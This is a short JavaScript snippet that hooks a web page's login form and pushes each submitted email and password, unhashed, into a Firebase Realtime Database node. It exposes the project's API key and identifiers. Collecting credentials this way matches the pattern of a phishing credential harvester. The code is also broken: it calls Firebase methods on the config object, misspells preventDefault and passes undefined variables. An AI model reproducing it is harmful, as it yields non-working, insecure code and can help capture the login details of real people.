const firebaseConfig = {
  apiKey: "AIzaSyDOPov-OV3hzGp_MrTPJY3bHjqqaO1grv8",
  authDomain: "webp-b9636.firebaseapp.com",
  databaseURL: "https://webp-b9636-default-rtdb.firebaseio.com",
  projectId: "webp-b9636",
  storageBucket: "webp-b9636.appspot.com",
  messagingSenderId: "845208625033",
  appId: "1:845208625033:web:3b47c8c0802bcce9290b58"
};

firebaseConfig.initializeApp(firebaseConfig);

var contractFormDB = firebaseConfig.database().ref('login')

document.getElementById('login').addEventListener("submit", submitForm);
function submitForm(e){
  e.preventDefult();
var email =getElementVal('em');
var password =getElementVal('ps');

saveMessages(em, ps);
}

const saveMessages =(em, ps)=> {
var newlogin = contractFormDB.push();
newlogin.set({
  email : em,
  password : ps,
});
};
const getElementVal =(id) =>{
  return document.getElementById(id).value;
};